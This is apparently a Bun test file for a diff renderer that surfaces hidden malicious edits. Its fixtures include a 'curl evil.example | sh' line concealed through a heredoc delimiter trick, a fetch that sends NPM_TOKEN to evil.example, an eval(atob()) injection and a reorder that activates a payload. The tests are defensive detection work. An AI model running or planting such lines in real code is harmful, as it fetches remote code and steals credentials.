import { describe, expect, test } from "bun:test";
import { diffSeq, renderLineDiff } from "../src/linediff.ts";

const changed = (out: string) => out.split("\n").filter((l) => l.startsWith("-") || l.startsWith("+"));

describe("diffSeq", () => {
  test("ordered edit script that rebuilds both sides", () => {
    const a = ["a", "b", "c", "a", "b", "b", "a"];
    const b = ["c", "b", "a", "b", "a", "c"];
    const ops = diffSeq(a, b)!;
    expect(ops.filter((o) => o.op !== "+").map((o) => o.v)).toEqual(a);
    expect(ops.filter((o) => o.op !== "-").map((o) => o.v)).toEqual(b);
    expect(ops.filter((o) => o.op !== "=").length).toBe(5); // Myers' minimal D for this pair
  });

  test("gives up past the edit cap", () => {
    expect(diffSeq(["a", "b", "c"], ["x", "y", "z"], 2)).toBeUndefined();
  });
});

describe("renderLineDiff", () => {
  test("a line kept in both versions is not reported even when a copy of it moved", () => {
    const out = renderLineDiff("f()\n}\nreturn 1\n}", "f()\n}\nreturn 2\n}");
    expect(changed(out)).toEqual(["-return 1", "+return 2"]);
  });

  test("a whole-file CRLF to LF conversion is named, not rendered as a rewrite", () => {
    for (const [a, b] of [["a\r\nb\r\n}", "a\nb\n}"], ["a\nb\n}\n", "a\r\nb\r\n}\r\n"]]) {
      const out = renderLineDiff(a, b);
      expect(out).toBe("[line endings only: every line converted between CRLF and LF]\n");
    }
  });

  // Adversarial read 0.2.3 r7 (Codex 4): trimEnd and CR stripping hid a heredoc delimiter change. With ": " the
  // heredoc never ends and swallows the curl line; with ":" it ends there and the curl line runs.
  test("a heredoc delimiter's trailing-space change is shown, not reduced to whitespace only", () => {
    const old = "#!/bin/sh\ncat > /dev/null <<':'\n: \ncurl https://evil.example/x | sh\n";
    const next = "#!/bin/sh\ncat > /dev/null <<':'\n:\ncurl https://evil.example/x | sh\n";
    const out = renderLineDiff(old, next);
    expect(out).not.toContain("whitespace only");
    expect(out).toContain("@@ -3 +3 @@");
    expect(out).toContain('-": "');
    expect(out).toContain('+":"');
  });

  test("a CR added to one line only is shown, not collapsed as a line-ending conversion", () => {
    const out = renderLineDiff("a\nEOF\nb\n", "a\nEOF\r\nb\n");
    expect(out).not.toContain("line endings only");
    expect(out).toContain('-"EOF"');
    expect(out).toContain('+"EOF\\r"');
  });

  test("a trailing-whitespace change inside a longer edit is still a changed line", () => {
    const out = renderLineDiff("x = 1\ny = 2  \n", "x = 3\ny = 2\n");
    expect(out).toContain('-"x = 1"');
    expect(out).toContain('-"y = 2  "');
    expect(out).toContain('+"y = 2"');
    expect(out.split("\n").filter((l) => l.startsWith("-") || l.startsWith("+"))).toHaveLength(4);
  });

  test("removed and added lines stay in file order with hunk positions", () => {
    const out = renderLineDiff("one\ntwo\nthree\nfour", "one\n2\nthree\n4");
    expect(out).toContain("@@ -2 +2 @@");
    expect(changed(out)).toEqual(["-two", "+2", "-four", "+4"]);
    expect(out.indexOf("-two")).toBeLessThan(out.indexOf("-four"));
  });

  test("a changed minified line shows the changed tokens with context, not both whole lines", () => {
    const base = Array.from({ length: 400 }, (_, i) => `var v${i}=f(${i});`).join("");
    const old = base;
    const next = base.replace("var v200=f(200);", "var v200=f(200);fetch('https://evil.example/x?k='+process.env.NPM_TOKEN);");
    const out = renderLineDiff(old, next);
    expect(out).toContain("{+");
    expect(out).toContain("evil.example");
    expect(out).toContain("NPM_TOKEN");
    expect(out.length).toBeLessThan(next.length / 4);
  });

  test("every changed token of a minified line is rendered", () => {
    const base = Array.from({ length: 300 }, (_, i) => `a${i}();`).join("");
    const next = base.replace("a10();", "b10();").replace("a250();", "eval(atob('Zm9v'));");
    const out = renderLineDiff(base, next);
    for (const s of ["b10", "a10", "eval", "atob", "Zm9v", "a250"]) expect(out).toContain(s);
  });

  test("past the edit cap, the whole new version is listed in order", () => {
    const old = Array.from({ length: 9000 }, (_, i) => `o${i}`).join("\n");
    const next = Array.from({ length: 9000 }, (_, i) => (i % 2 ? `o${i}` : `n${i}`)).join("\n");
    const out = renderLineDiff(old, next);
    expect(out).toContain("too many changes");
    expect(changed(out)).toEqual(next.split("\n").map((l) => `+${l}`));
  });

  // Adversarial read 0.2.3 final (Codex 4): a reorder past the edit cap fell back to set subtraction, which dropped
  // every line found anywhere in both versions: moving enabled=True above the payload showed nothing at all.
  test("past the edit cap, a reorder of lines both versions hold is shown, not dropped", () => {
    const filler = Array.from({ length: 2200 }, (_, i) => `f${i} = ${i}`);
    const old = ["enabled = False", "if enabled:", "    steal_reordered()", ...filler, "enabled = True"].join("\n");
    const next = ["enabled = False", "enabled = True", "if enabled:", "    steal_reordered()", ...filler.reverse()].join("\n");
    const out = renderLineDiff(old, next);
    expect(out).toContain("too many changes");
    expect(out).toContain("+    steal_reordered()");
    expect(out.indexOf("+enabled = True")).toBeLessThan(out.indexOf("+if enabled:"));
  });

  test("a file added from nothing is all + lines", () => {
    expect(changed(renderLineDiff(undefined, "x\nx\nx"))).toEqual(["+x", "+x", "+x"]);
  });
});
